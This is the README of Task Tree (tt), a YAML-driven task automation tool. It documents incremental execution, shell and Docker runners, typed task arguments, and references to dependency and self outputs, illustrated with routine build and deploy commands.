# Task Tree (tt)

[![Tests](https://github.com/kevinchannon/task-tree/actions/workflows/test.yml/badge.svg)](https://github.com/kevinchannon/task-tree/actions/workflows/test.yml)

A task automation tool that combines simple command execution with dependency tracking and incremental execution.

## Motivation
In any project of even moderate size, various scripts inevitably come into being along the way. These scripts often must be run in a particular order, or at a particular time. For historical reasons, this almost certainly a problem if your project is developed in a Linux environment; in Windows, an IDE like Visual Studio may be taking care of a significant proportion of your build, packaging and deployment tasks. Then again, it may not...

The various incantations that have to be issued to build, package, test and deploy a project can build up and then all of a sudden there's only a few people that remember which to invoke and when and then people start making helpful readme guides on what to do with the scripts and then those become out of date and start telling lies about things and so on.

Then there's the scripts themselves. In Linux, they're probably a big pile of Bash and Python, or something (Ruby, Perl, you name it). You can bet the house on people solving the problem of passing parameters to their scripts in a whole bunch of different and inconsistent ways.

```bash
#!/usr/bin/env bash
# It's an environment variable defined.... somewhere?
echo "FOO is: $FOO"
```
```bash
#!/usr/bin/env bash
# Using simple positional arguments... guess what means what when you're invoking it!
echo "First: $1, Second: $2"
```
```bash
#!/usr/bin/env bash
# Oooooh fancy "make me look like a proper app" named option parsing... don't try and do --foo=bar though!
FOO=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        --foo) FOO=$2; shift ;;
        --)    break ;;
        *)     echo "Unknown: $1";;
    esac
    shift
done
```
```bash
#!/usr/bin/env bash
# This thing...
ARGS=$(getopt -o f:b --long foo:,bar: -n 'myscript' -- "$@")
eval set -- "$ARGS"
while true; do
    case "$1" in
        -b|--bar) echo "Bar: $2"; shift 2 ;;
        -f|--foo) echo "Foo: $2"; shift 2 ;;
        --) shift; break ;;
        *) break ;;
    esac
done
```

What about help info? Who has time to wire that in?

### The point
Is this just whining and moaning? Should we just man up and revel in our own ability to memorize all the right incantations like some kind of scripting shaman?

... No. That's **a dumb idea**.

Task Tree allows you to pile all the knowledge of **what** to run, **when** to run it, **where** to run it and **how** to run it into a single, readable place. Then you can delete all the scripts that no-one knows how to use and all the readme docs that lie to the few people that actually waste their time reading them.

The tasks you need to perform to deliver your project become summarised in an executable file that looks like:
```yaml
tasks:
  build:
    desc: Compile stuff
    outputs: [target/release/bin]
    cmd: cargo build --release

  package:
     desc: build installers
     deps: [build]
     outputs: [awesome.deb]
     cmd: |
        for bin in target/release/*; do
            if [[ -x "$bin" && ! -d "$bin" ]]; then
                install -Dm755 "$bin" "debian/awesome/usr/bin/$(basename "$bin")"
            fi
        done

        dpkg-buildpackage -us -uc

  test:
    desc: Run tests
    deps: [package]
    inputs: [tests/**/*.py]
    cmd: PYTHONPATH=src python3 -m pytest tests/ -v
```

If you want to run the tests then:
```bash
tt test
```
Boom! Done. `build` will always run, because there's no sensible way to know what Cargo did. However, if Cargo decided that nothing needed to be done and didn't touch the binaries, then `package` will realize that and not do anything. Then `test` will just run with the new tests that you just wrote. If you then immediately run `test` again, then `test` will figure out that none of the dependencies did anything and that none of the test files have changed and then just _do nothing_ - as it should.

This is a toy example, but you can image how it plays out on a more complex project.

## Installation

### From PyPI (Recommended)

```bash
pipx install tasktree
```

If you have multiple Python interpreter versions installed, and the _default_ interpreter is a version <3.11, then you can use `pipx`'s `--python` option to specify an interpreter with a version >=3.11:

```bash
# If the target version is on the PATH
pipx install --python python3.12 tasktree

# With a path to an interpreter
pipx install --python /path/to/python3.12 tasktree
```

### From Source

For the latest unreleased version from GitHub:

```bash
pipx install git+https://github.com/kevinchannon/task-tree.git
```

Or to install from a local clone:

```bash
git clone https://github.com/kevinchannon/task-tree.git
cd tasktree
pipx install .
```

## Editor Support

Task Tree includes a [JSON Schema](schema/tasktree-schema.json) that provides autocomplete, validation, and documentation in modern editors.

### VS Code

Install the [YAML extension](https://marketplace.visualstudio.com/items?itemName=redhat.vscode-yaml), then add to your workspace `.vscode/settings.json`:

```json
{
  "yaml.schemas": {
    "https://raw.githubusercontent.com/kevinchannon/tasktree/main/schema/tasktree-schema.json": [
      "tasktree.yaml",
      "tt.yaml"
    ]
  }
}
```

Or add a comment at the top of your `tasktree.yaml`:

```yaml
# yaml-language-server: $schema=https://raw.githubusercontent.com/kevinchannon/tasktree/main/schema/tasktree-schema.json

tasks:
  build:
    cmd: cargo build
```

See [schema/README.md](schema/README.md) for IntelliJ/PyCharm and command-line validation.

## Quick Start

Create a `tasktree.yaml` (or `tt.yaml`) in your project:

```yaml
tasks:
  build:
    desc: Compile the application
    outputs: [target/release/bin]
    cmd: cargo build --release

  test:
    desc: Run tests
    deps: [build]
    cmd: cargo test
```

Run tasks:

```bash
tt                # Print the help
tt --help         # ...also print the help
tt --list         # Show all available tasks
tt build          # Build the application (assuming this is in your tasktree.yaml)
tt test           # Run tests (builds first if needed)
```

## Core Concepts

### Intelligent Incremental Execution

Task Tree only runs tasks when necessary. A task executes if:

- Its definition (command, outputs, working directory, runner) has changed
- Any input files have changed since the last run
- Any dependencies have re-run
- It has never been executed before
- It has no inputs or outputs (always runs)
- The execution runner has changed (CLI override or runner config change)

### Automatic Input Inheritance

Tasks automatically inherit inputs from dependencies, eliminating redundant declarations:

```yaml
tasks:
  build:
    outputs: [dist/app]
    cmd: go build -o dist/app

  package:
    deps: [build]
    outputs: [dist/app.tar.gz]
    cmd: tar czf dist/app.tar.gz dist/app
    # Automatically tracks dist/app as an input
```

### Single State File

All state lives in `.tasktree-state` at your project root. Stale entries are automatically pruned—no manual cleanup needed.

## Task Definition

### Basic Structure

```yaml
tasks:
  task-name:
    desc: Human-readable description (optional)
    deps: [other-task]                     # Task dependencies
    inputs: [src/**/*.go]                  # Explicit input files (glob patterns)
    outputs: [dist/binary]                 # Output files (glob patterns)
    working_dir: subproject/               # Execution directory (default: project root)
    run_in: bash-strict                    # Execution runner (optional)
    private: false                         # Hide from --list output (default: false)
    task_output: all                       # Control task output: all, out, err, on-err, none (default: all)
    args:                                   # Task parameters
      - param1                              # Simple argument
      - param2: { type: path, default: "." }  # With type and default
    cmd: go build -o dist/binary           # Command to execute
```

**Task name constraints:**
- Task names cannot contain dots (`.`) - they are reserved for namespacing imported tasks
- Example: `build.release` is invalid as a task name, but valid as a reference to task `release` in namespace `build`

### Commands

All commands are executed by writing them to temporary script files. This provides consistent behavior and better shell syntax support:

```yaml
tasks:
  build:
    cmd: cargo build --release

  deploy:
    cmd: |
      mkdir -p dist
      cp build/* dist/
      rsync -av dist/ server:/opt/app/
```

Commands preserve shell syntax (line continuations, heredocs, etc.) and support shebangs on Unix/macOS.

Or use folded blocks for long single-line commands:

```yaml
tasks:
  compile:
    cmd: >
      gcc -o bin/app
      src/*.c
      -I include
      -L lib -lm
```

### Execution Runners

Configure custom shell runners for task execution. Use the `preamble` field to add initialization code to all commands:

```yaml
runners:
  default: bash-strict

  bash-strict:
    shell: bash
    preamble: |               # Prepended to all commands
      set -euo pipefail

  python:
    shell: python

  powershell:
    shell: powershell
    preamble: |
      $ErrorActionPreference = 'Stop'

tasks:
  build:
    # Uses 'default' runner (bash-strict)
    cmd: cargo build --release

  analyze:
    run_in: python
    cmd: |
      import sys
      print(f"Analyzing with Python {sys.version}")
      # ... analysis code ...

  windows-task:
    run_in: powershell
    cmd: |
      Compress-Archive -Path dist/* -DestinationPath package.zip
```

**Runner resolution priority:**
1. CLI override: `tt --runner python build`
2. Task's `run_in` field
3. Recipe's `default` runner
4. Project config (`.tasktree-config.yml`)
5. User config (`~/.config/tasktree/config.yml`)
6. Machine config (`/etc/tasktree/config.yml`)
7. Platform default (bash on Unix, cmd on Windows)

**Platform defaults** when no runners are configured:
- **Unix/macOS**: bash
- **Windows**: cmd

### Configuration Files

Default runner settings can be configured outside of task files using configuration files at three levels:

**1. Project-level config** (`.tasktree-config.yml` at project root)
```yaml
runners:
  default:
    shell: bash
    preamble: |
      set -euo pipefail
```

**2. User-level config** (`~/.config/tasktree/config.yml` on Linux/macOS, `%APPDATA%\tasktree\config.yml` on Windows)
```yaml
runners:
  default:
    shell: zsh
    preamble: |
      # User-specific shell initialization
      export PATH="$HOME/.local/bin:$PATH"
```

**3. Machine-level config** (`/etc/tasktree/config.yml` on Linux/macOS, `C:\ProgramData\tasktree\config.yml` on Windows)
```yaml
runners:
  default:
    shell: bash
    preamble: |
      # System-wide shell configuration
      set -euo pipefail
```

**Key points:**
- Config files use the same runner schema as `tasktree.yaml`
- The runner **must** be named `default` in config files
- Project config overrides user config, which overrides machine config
- Config files are optional; missing configs are not errors
- Relative paths in configs (e.g., dockerfile paths) are resolved relative to the project root at execution time
- Invalid configs are handled gracefully:
  - A warning message is displayed with the error details
  - Task Tree falls back to the next level in the hierarchy
  - Execution continues normally with the fallback runner

**Use cases:**
- **Project config**: Set consistent shell defaults for all contributors
- **User config**: Customize shell environment across all your projects
- **Machine config**: Set system-wide defaults for all users (requires admin/root)

**Example workflow:**
```bash
# Machine admin sets system-wide strict bash
$ sudo tee /etc/tasktree/config.yml > /dev/null << 'EOF'
runners:
  default:
    shell: bash
    preamble: set -euo pipefail
EOF

# User prefers zsh for their work
$ mkdir -p ~/.config/tasktree
$ cat > ~/.config/tasktree/config.yml << 'EOF'
runners:
  default:
    shell: zsh
EOF

# Project requires specific Python environment
$ cat > .tasktree-config.yml << 'EOF'
runners:
  default:
    dockerfile: dev.dockerfile
    context: .
EOF

# Result: Project's dockerfile runner is used (highest precedence)
```

### Docker Runners

Execute tasks inside Docker containers for reproducible builds and isolated execution:

```yaml
runners:
  builder:
    dockerfile: build.dockerfile
    context: .
    volumes:
      - .:/workspace
    working_dir: /workspace

tasks:
  build:
    run_in: builder
    cmd: cargo build --release
```

#### User Mapping

By default, tasks run inside Docker containers execute as your current host user (UID:GID) rather than root. This ensures files created in mounted volumes have correct ownership on the host filesystem.

To run as root inside the container (e.g., for package installation or privileged operations), set `run_as_root: true`:

```yaml
runners:
  privileged:
    dockerfile: admin.dockerfile
    context: .
    run_as_root: true
    volumes:
      - .:/workspace
```

**Note**: On Windows, user mapping is handled automatically by Docker Desktop and this setting has no effect.

#### Use Cases for `run_as_root: true`

You may need to set `run_as_root: true` when:
- Container process needs to bind to privileged ports (<1024)
- Installing packages during task execution
- Software explicitly requires root privileges

#### Working Directory Resolution

When executing tasks in Docker containers, the working directory is determined by three factors (in order of precedence):

1. **Task's `working_dir`** - If specified, overrides all other settings
2. **Runner's `working_dir`** - If specified and task doesn't specify, uses runner's directory
3. **Dockerfile's `WORKDIR`** - If neither task nor runner specify, Docker uses the Dockerfile's WORKDIR directive

**Examples:**

```yaml
runners:
  builder:
    dockerfile: build.dockerfile
    context: .
    volumes:
      - .:/workspace
    working_dir: /workspace  # Sets default for all tasks using this runner

tasks:
  # Uses /workspace (from runner)
  build:
    run_in: builder
    cmd: cargo build --release

  # Uses /workspace/tests (combines runner + task)
  test:
    run_in: builder
    working_dir: tests
    cmd: cargo test

  # Uses /workspace/docs (overrides runner)
  docs:
    run_in: builder
    working_dir: /workspace/docs
    cmd: make html
```

```yaml
runners:
  # No working_dir specified - relies on Dockerfile
  builder:
    dockerfile: Dockerfile  # Contains: WORKDIR /app
    context: .
    volumes:
      - .:/code

tasks:
  # Uses /app (from Dockerfile's WORKDIR)
  build:
    run_in: builder
    cmd: make build

  # Uses /app/tests (Dockerfile WORKDIR + task working_dir)
  test:
    run_in: builder
    working_dir: tests
    cmd: pytest

  # Uses /code (absolute path, overrides Dockerfile)
  analyze:
    run_in: builder
    working_dir: /code
    cmd: pylint src/
```

**Key Points:**

- If both runner and task specify `working_dir`, they are **combined** (runner/task)
- If neither specifies `working_dir`, Docker uses the Dockerfile's `WORKDIR` directive
- Absolute paths (`/path`) override and are not combined
- Relative paths are combined with the runner's `working_dir` (if set)
- The `working_dir` setting determines where commands execute, not where volume mounts map files

### Parameterised Tasks

Tasks can accept arguments with optional type annotations and defaults:

```yaml
tasks:
  deploy:
    args:
      - environment: { choices: ["dev", "staging", "production"] }
      - region: { choices: ["us-east-1", "eu-west-1"], default: "eu-west-1" }
    deps: [build]
    cmd: |
      aws s3 cp dist/app.zip s3://{{ arg.environment }}-{{ arg.region }}/
      aws lambda update-function-code --function-name app-{{ arg.environment }}
```

Invoke with: `tt deploy production` or `tt deploy staging us-east-1` or `tt deploy staging region=us-east-1`.

If you try an invalid environment like `tt deploy testing`, you'll get a clear error showing the valid choices.

**Argument syntax:**

```yaml
args:
  - name                                          # Simple argument (type: str, no default)
  - port: { type: int }                           # With type annotation
  - region: { default: "eu-west-1" }              # With default (type inferred as str)
  - count: { type: int, default: 10 }             # With both type and default
  - replicas: { min: 1, max: 100 }                # Type inferred as int from min/max
  - timeout: { min: 0.5, max: 30.0, default: 10.0 }  # Type inferred as float
  - environment: { choices: ["dev", "prod"] }     # Type inferred as str from choices
  - priority: { type: int, choices: [1, 2, 3], default: 2 }  # With choices and default
```

**Range constraints** (min/max):

For `int` and `float` arguments, you can specify `min` and/or `max` constraints to validate values at parse time:

```yaml
args:
  - replicas: { min: 1, max: 100 }              # Type inferred as int from min/max
  - port: { min: 1024 }                         # Type inferred as int from min
  - percentage: { max: 100.0 }                  # Type inferred as float from max
  - workers: { min: 1, max: 16, default: 4 }    # Type inferred as int (all consistent)
```

**Discrete choices**:

For arguments with a specific set of valid values, use the `choices` field to specify allowed values. This provides clear validation errors and self-documenting task definitions:

```yaml
args:
  - environment: { choices: ["dev", "staging", "prod"] }  # Type inferred as str from choices
  - priority: { choices: [1, 2, 3] }                      # Type inferred as int from choices
  - region: { type: str, choices: ["us-east-1", "eu-west-1"], default: "us-east-1" }
```

**Choices features:**
- Type is automatically inferred from the first choice value if not explicitly specified
- All choices must have the same type
- Default value (if provided) must be one of the valid choices
- `choices` and `min`/`max` are mutually exclusive
- Boolean types cannot have choices (already limited to true/false)
- Validation happens after type conversion, producing clear error messages showing valid options

* Both bounds are **inclusive**: `min` is the smallest allowable value, `max` is the largest
* Can specify `min` alone, `max` alone, or both together
* Type can be inferred from `min`, `max`, or `default` - all provided values must have consistent types
* When explicit `type` is specified, all `min`, `max`, and `default` values must match that type
* Default values must satisfy the min/max constraints
* Validation happens at parse time with clear error messages
* Not supported for non-numeric types (str, bool, path, etc.)

When no explicit type is provided, the type is inferred from `default`, `min`, or `max` values (all must have consistent types). Valid argument types are:

* int - an integer value (e.g. 0, 10, 123, -9)
* float - a floating point value (e.g. 1.234, -3.1415, 2e-4)
* bool - Boolean-ish value (e.g. true, false, yes, no, 1, 0, etc)
* str - a string
* path - a pathlike string
* datetime - a datetime in the format 2025-12-17T16:56:12
* ip - an ip address (v4 or v6)
* ipv4 - an IPv4 value
* ipv6 - an IPv6 value
* email - String validated, but not positively confirmed to be a reachable address.
* hostname - looks like a hostname, resolution of the name is not attempted as part of the validation

Different argument values are tracked separately—tasks re-run when invoked with new arguments.

### Exported Arguments

Arguments can be prefixed with `$` to export them as environment variables instead of using template substitution. This mimics Justfile behavior and is cleaner for shell-heavy commands:

```yaml
tasks:
  deploy:
    args:
      - $server
      - $user: { default: "admin" }
      - port: { type: int, default: 8080 }
    cmd: |
      echo "Deploying to $server as $user on port {{ arg.port }}"
      ssh $user@$server "systemctl restart app --port {{ arg.port }}"
```

**Key differences between regular and exported arguments:**

| Feature | Regular Argument | Exported Argument |
|---------|-----------------|-------------------|
| **Syntax** | `- name` | `- $name` |
| **Usage in commands** | `{{ arg.name }}` | `$name` (shell variable) |
| **Type annotations** | Allowed: `{ type: int }` | **Not allowed** (always strings) |
| **Defaults** | `{ default: 8080 }` | `- $port: { default: "8080" }` |
| **Availability** | Template substitution only | Environment variable (all subprocesses) |
| **Case handling** | N/A | Preserves exact case as written |

**Invocation examples:**

```bash
# Positional arguments (exported and regular mixed)
tt deploy prod-server admin port=9000

# Named arguments
tt deploy server=prod-server user=admin port=9000

# Using defaults
tt deploy prod-server  # user defaults to "admin"
```

**Important notes:**

- **Exported arguments are always strings**: Even numeric-looking defaults like `$port=8080` result in the string `"8080"`. When using boolean-like values in shell scripts, use string comparison: `[ "$verbose" = "true" ]`
- **Case preservation**: Environment variable names preserve the case exactly as written. `$Server` and `$server` are distinct variables (except on Windows where environment variables are case-insensitive)
- **Environment variable precedence**: Exported arguments override any existing environment variables with the same name
- **Cannot use template substitution**: Exported arguments are **not** available for `{{ arg.name }}` substitution. Attempting to use `{{ arg.server }}` when `server` is defined as `$server` results in an error

**Use cases for exported arguments:**

- Shell-heavy commands with many environment variable references
- Passing credentials to subprocesses
- Commands that spawn multiple subshells (exported vars available in all)
- Integration with tools that expect environment variables

**Example with Docker runners:**

```yaml
runners:
  docker-build:
    dockerfile: Dockerfile
    context: .
    volumes:
      - .:/workspace

tasks:
  build:
    run_in: docker-build
    args: [$BUILD_TAG, $REGISTRY]
    cmd: |
      docker build -t $REGISTRY/app:$BUILD_TAG .
      docker push $REGISTRY/app:$BUILD_TAG
```

Exported arguments are passed through to Docker containers as environment variables, overriding any Docker runner configuration.

#### Troubleshooting Exported Arguments

**Problem: Exported argument appears undefined in script**

If your script reports an undefined variable:

1. Verify the argument is prefixed with `$` in the `args` list
2. Check that you're passing the argument when invoking the task:
   ```bash
   tt deploy prod-server  # If server is required
   ```
3. On Windows, use `%VAR%` syntax instead of `$VAR`:
   ```yaml
   tasks:
     test:
       args: [$server]
       cmd: echo %server%  # Windows
       # cmd: echo $server  # Unix/macOS
   ```

**Problem: How to debug which args are exported vs regular**

Use `tt --show <task-name>` to view the task definition:
```bash
tt --show deploy
```

This displays the task with its argument specifications. Exported arguments have the `$` prefix.

**Problem: Case-sensitive variable confusion**

On Unix systems, `$Server` and `$server` are different variables. If you see unexpected behavior:

1. Check that all references use the exact same case
2. Task Tree will warn during parsing if it detects arguments that differ only in case
3. Consider using lowercase consistently for environment variables to avoid confusion

**Problem: Exported argument with default value not set**

If an exported argument with a default isn't available as an environment variable:

1. Ensure you're running on the latest version (this was a bug in earlier versions)
2. The CLI automatically applies defaults before execution
3. You can explicitly provide the value: `tt deploy prod-server port=8080`

### Parameterized Dependencies

Dependencies can invoke tasks with specific arguments, enabling flexible and reusable task graphs:

**Syntax:**

```yaml
tasks:
  # Task with parameters
  process:
    args:
      - mode
      - verbose: { default: false }
    cmd: echo "mode={{arg.mode}} verbose={{arg.verbose}}"

  # Simple dependency (uses defaults)
  consumer1:
    deps: [process]  # Equivalent to: process(mode must be provided)
    cmd: echo "done"

  # Positional arguments
  consumer2:
    deps:
      - process: [debug, true]  # Maps to: mode=debug, verbose=true
    cmd: echo "done"

  # Named arguments
  consumer3:
    deps:
      - process: {mode: release, verbose: false}
    cmd: echo "done"

  # Multiple invocations with different args
  multi_build:
    deps:
      - process: [debug]
      - process: [release]
    cmd: echo "All builds complete"
```

**Key behaviors:**

- **Simple string form** (`- task_name`): Uses task defaults for all arguments. Required arguments must have defaults or task invocation fails.
- **Positional form** (`- task_name: [arg1, arg2]`): Arguments mapped by position. Can omit trailing args if they have defaults.
- **Named form** (`- task_name: {arg1: val1}`): Arguments mapped by name. Can omit any arg with a default.
- **Multiple invocations**: Same task with different arguments creates separate graph nodes, each executing independently.
- **Normalization**: All forms normalized to named arguments with defaults filled before execution.
- **Cache separation**: `process(debug)` and `process(release)` cache independently.

**Restrictions:**

- **No empty lists**: `- task: []` is invalid (use `- task` instead)
- **No mixed positional and named**: Choose one form per dependency
- **Single-key dicts**: `{task1: [x], task2: [y]}` is invalid (multi-key not allowed)

**Validation:**

Validation happens at graph construction time with clear error messages:

```
Task 'process' takes 2 arguments, got 3
Task 'build' has no argument named 'mode'
Task 'deploy' requires argument 'environment' (no default provided)
```

**Example use cases:**

```yaml
tasks:
  # Compile for different platforms
  compile:
    args: [target]
    cmd: cargo build --target {{arg.target}}

  dist:
    deps:
      - compile: [x86_64-unknown-linux-gnu]
      - compile: [aarch64-unknown-linux-gnu]
    cmd: tar czf dist.tar.gz target/*/release/app

  # Run tests with different configurations
  test:
    args: [config]
    cmd: pytest --config={{arg.config}}

  ci:
    deps:
      - test: [unit]
      - test: [integration]
      - test: [e2e]
    cmd: echo "All tests passed"
```

### Dependency Output References

Tasks can reference named outputs from their dependencies, enabling dynamic workflows where build artifacts, generated filenames, and other values are passed between tasks.

**Named Outputs:**

Tasks can define outputs with names for easy referencing:

```yaml
tasks:
  build:
    outputs:
      - bundle: "dist/app.js"        # Named output
      - sourcemap: "dist/app.js.map" # Named output
    cmd: webpack build

  deploy:
    deps: [build]
    cmd: |
      echo "Deploying {{ dep.build.outputs.bundle }}"
      scp {{ dep.build.outputs.bundle }} server:/var/www/
      scp {{ dep.build.outputs.sourcemap }} server:/var/www/
```

**Syntax:**

- **Defining named outputs**: `outputs: [{ name: "path/to/file" }]`
- **Referencing outputs**: `{{ dep.task_name.outputs.output_name }}`
- **Mixed format**: Can combine named and anonymous outputs in the same task

**Examples:**

```yaml
tasks:
  # Generate a config file
  generate-config:
    outputs:
      - config: "build/config.json"
    cmd: |
      mkdir -p build
      echo '{"version": "1.0.0"}' > build/config.json

  # Compile using the generated config
  compile:
    deps: [generate-config]
    outputs:
      - binary: "build/app"
      - symbols: "build/app.sym"
    cmd: |
      echo "Using config: {{ dep.generate-config.outputs.config }}"
      gcc -o build/app src/*.c

  # Package multiple dependency outputs
  package:
    deps: [compile]
    outputs:
      - archive: "dist/app.tar.gz"
    cmd: |
      mkdir -p dist
      tar czf {{ dep.package.outputs.archive }} \
        {{ dep.compile.outputs.binary }} \
        {{ dep.compile.outputs.symbols }}
```

**Mixed Named and Anonymous Outputs:**

Tasks can have both named and anonymous outputs:

```yaml
tasks:
  build:
    outputs:
      - binary: "build/app"      # Named - can be referenced
      - "build/app.debug"        # Anonymous - tracked but not referenceable
      - manifest: "build/manifest.json"  # Named - can be referenced
    cmd: make all
```

**Transitive References:**

Output references work across multiple levels of dependencies:

```yaml
tasks:
  base:
    outputs:
      - lib: "out/libbase.a"
    cmd: gcc -c base.c -o out/libbase.a

  middleware:
    deps: [base]
    outputs:
      - lib: "out/libmiddleware.a"
    cmd: |
      # Reference the base library
      gcc -c middleware.c {{ dep.base.outputs.lib }} -o out/libmiddleware.a

  app:
    deps: [middleware]
    cmd: |
      # Reference middleware, which transitively used base
      gcc main.c {{ dep.middleware.outputs.lib }} -o app
```

**Key Behaviors:**

- **Template resolution**: Output references are resolved during dependency graph planning (in topological order)
- **Fail-fast validation**: Errors are caught before execution begins
- **Clear error messages**: If an output name doesn't exist, you get a list of available named outputs
- **Backward compatible**: Existing anonymous outputs (`outputs: ["file.txt"]`) work unchanged
- **Automatic input tracking**: Named outputs are automatically tracked as implicit inputs for dependent tasks

**Error Messages:**

If you reference a non-existent output:

```yaml
tasks:
  build:
    outputs:
      - bundle: "dist/app.js"
    cmd: webpack build

  deploy:
    deps: [build]
    cmd: echo "{{ dep.build.outputs.missing }}"  # Error!
```

You'll get a clear error before execution:

```
Task 'deploy' references output 'missing' from task 'build',
but 'build' has no output named 'missing'.
Available named outputs in 'build': bundle
Hint: Define named outputs like: outputs: [{ missing: 'path/to/file' }]
```

**Use Cases:**

- **Dynamic artifact names**: Pass generated filenames between tasks
- **Build metadata**: Reference manifests, checksums, or version files
- **Multi-stage builds**: Chain compilation steps with specific output references
- **Deployment pipelines**: Reference exact artifacts to deploy
- **Configuration propagation**: Pass generated config files through build stages

### Self-References

Tasks can reference their own inputs and outputs using `{{ self.inputs.name }}` (named access) or `{{ self.inputs.0 }}` (positional access) templates. This eliminates repetition when paths contain variables or when tasks have multiple inputs/outputs.

**Named Inputs and Outputs:**

Just like dependency output references, inputs and outputs can have names:

```yaml
tasks:
  process:
    inputs:
      - src: "data/input.json"      # Named input
      - config: "config.yaml"        # Named input
    outputs:
      - result: "output/result.json" # Named output
      - log: "output/process.log"    # Named output
    cmd: |
      process-tool \
        --input {{ self.inputs.src }} \
        --config {{ self.inputs.config }} \
        --output {{ self.outputs.result }} \
        --log {{ self.outputs.log }}
```

**Syntax:**

- **Defining named inputs**: `inputs: [{ name: "path/to/file" }]`
- **Defining named outputs**: `outputs: [{ name: "path/to/file" }]`
- **Defining anonymous inputs**: `inputs: ["path/to/file"]`
- **Defining anonymous outputs**: `outputs: ["path/to/file"]`
- **Referencing by name**: `{{ self.inputs.input_name }}` or `{{ self.outputs.output_name }}`
- **Referencing by index**: `{{ self.inputs.0 }}` or `{{ self.outputs.1 }}` (0-based)
- **Mixed format**: Can combine named and anonymous inputs/outputs in the same task

**Why Use Self-References?**

Self-references follow the DRY (Don't Repeat Yourself) principle:

```yaml
# Without self-references - repetitive
tasks:
  build:
    inputs: [src/app-{{ var.version }}.c]
    outputs: [build/app-{{ var.version }}.o]
    cmd: gcc src/app-{{ var.version }}.c -o build/app-{{ var.version }}.o
```
```yaml
# With self-references - DRY
tasks:
  build:
    inputs:
      - source: src/app-{{ var.version }}.c
    outputs:
      - object: build/app-{{ var.version }}.o
    cmd: gcc {{ self.inputs.source }} -o {{ self.outputs.object }}
```

**Working with Variables:**

Self-references work seamlessly with variables:

```yaml
variables:
  platform: linux
  arch: x86_64

tasks:
  compile:
    inputs:
      - src: src/{{ var.platform }}/main.c
      - header: include/{{ var.arch }}/defs.h
    outputs:
      - binary: build/{{ var.platform }}-{{ var.arch }}/app
    cmd: |
      gcc {{ self.inputs.src }} \
        -include {{ self.inputs.header }} \
        -o {{ self.outputs.binary }}
```

Variables are evaluated first, then self-references substitute the expanded paths.

**Working with Arguments:**

Self-references work with parameterized tasks:

```yaml
tasks:
  deploy:
    args: [environment]
    inputs:
      - config: configs/{{ arg.environment }}/app.yaml
    outputs:
      - deployed: deployed-{{ arg.environment }}.yaml
    cmd: |
      validate {{ self.inputs.config }}
      deploy {{ self.inputs.config }} > {{ self.outputs.deployed }}
```

```bash
tt deploy production  # Uses configs/production/app.yaml
tt deploy staging     # Uses configs/staging/app.yaml
```

**Working with Dependency Outputs:**

Self-references and dependency references can be used together:

```yaml
tasks:
  build:
    outputs:
      - artifact: dist/app.js
    cmd: webpack build

  package:
    deps: [build]
    inputs:
      - manifest: package.json
    outputs:
      - tarball: release.tar.gz
    cmd: tar czf {{ self.outputs.tarball }} \
           {{ self.inputs.manifest }} \
           {{ dep.build.outputs.artifact }}
```

**Mixed Named and Anonymous:**

Tasks can mix named and anonymous inputs/outputs:

```yaml
tasks:
  build:
    inputs:
      - config: build.yaml  # Named - can reference
      - src/**/*.c          # Anonymous - tracked but not referenceable
    outputs:
      - binary: bin/app     # Named - can reference
      - bin/app.debug       # Anonymous - tracked but not referenceable
    cmd: build-tool --config {{ self.inputs.config }} --output {{ self.outputs.binary }}
```

**Positional Index References:**

In addition to named references, you can access inputs and outputs by their positional index using `{{ self.inputs.0 }}`, `{{ self.inputs.1 }}`, etc. This provides an alternative way to reference items, especially useful for:

- **Anonymous inputs/outputs**: Reference items that don't have names
- **Simple sequential access**: When order is more important than naming
- **Mixed with named access**: Use both styles in the same task

**Syntax:**

```yaml
tasks:
  process:
    inputs: ["file1.txt", "file2.txt", "file3.txt"]
    outputs: ["output1.txt", "output2.txt"]
    cmd: |
      cat {{ self.inputs.0 }} {{ self.inputs.1 }} > {{ self.outputs.0 }}
      cat {{ self.inputs.2 }} > {{ self.outputs.1 }}
```

Indices follow YAML declaration order, starting from 0 (zero-based indexing):
- First input/output = index 0
- Second input/output = index 1
- Third input/output = index 2, etc.

**Works with Both Named and Anonymous:**

```yaml
tasks:
  build:
    inputs:
      - config: "build.yaml"  # Index 0, also accessible as {{ self.inputs.config }}
      - "src/**/*.c"          # Index 1, ONLY accessible as {{ self.inputs.1 }}
      - headers: "include/*.h" # Index 2, also accessible as {{ self.inputs.headers }}
    outputs:
      - "dist/app.js"         # Index 0
      - bundle: "dist/bundle.js" # Index 1, also accessible as {{ self.outputs.bundle }}
    cmd: |
      # Mix positional and named references
      build-tool \
        --config {{ self.inputs.0 }} \
        --sources {{ self.inputs.1 }} \
        --headers {{ self.inputs.headers }} \
        --output {{ self.outputs.bundle }}
```

**Same Item, Multiple Ways:**

Named items can be accessed by both name and index:

```yaml
tasks:
  copy:
    inputs:
      - source: data.txt
    cmd: |
      # These are equivalent:
      cat {{ self.inputs.source }} > copy1.txt
      cat {{ self.inputs.0 }} > copy2.txt
```

**With Variables and Arguments:**

Positional references work with variable-expanded paths:

```yaml
variables:
  version: "1.0"

tasks:
  package:
    args: [platform]
    inputs:
      - "dist/app-{{ var.version }}.js"
      - "dist/lib-{{ arg.platform }}.so"
    outputs: ["release-{{ var.version }}-{{ arg.platform }}.tar.gz"]
    cmd: tar czf {{ self.outputs.0 }} {{ self.inputs.0 }} {{ self.inputs.1 }}
```

**Index Boundaries:**

Indices are validated before execution:

```yaml
tasks:
  build:
    inputs: ["file1.txt", "file2.txt"]
    cmd: cat {{ self.inputs.5 }}  # Error: index 5 out of bounds!
```

Error message:
```
Task 'build' references input index '5' but only has 2 inputs (indices 0-1)
```

**Empty Lists:**

Referencing an index when no inputs/outputs exist:

```yaml
tasks:
  generate:
    cmd: echo "test" > {{ self.outputs.0 }}  # Error: no outputs defined!
```

Error message:
```
Task 'generate' references output index '0' but has no outputs defined
```

**When to Use Index References:**

- **Anonymous items**: Only way to reference inputs/outputs without names
- **Order-based processing**: When the sequence matters more than naming
- **Simple tasks**: Quick access without defining names
- **Compatibility**: Accessing items in legacy YAML that uses anonymous format

**When to Use Named References:**

- **Clarity**: Names make commands more readable (`{{ self.inputs.config }}` vs `{{ self.inputs.2 }}`)
- **Maintainability**: Adding/removing items doesn't break indices
- **Complex tasks**: Many inputs/outputs are easier to manage with names

**Error Messages:**

If you reference a non-existent input or output:

```yaml
tasks:
  build:
    inputs:
      - src: input.txt
    cmd: cat {{ self.inputs.missing }}  # Error!
```

You'll get a clear error before execution:

```
Task 'build' references input 'missing' but has no input named 'missing'.
Available named inputs: src
Hint: Define named inputs like: inputs: [{ missing: 'path/to/file' }]
```

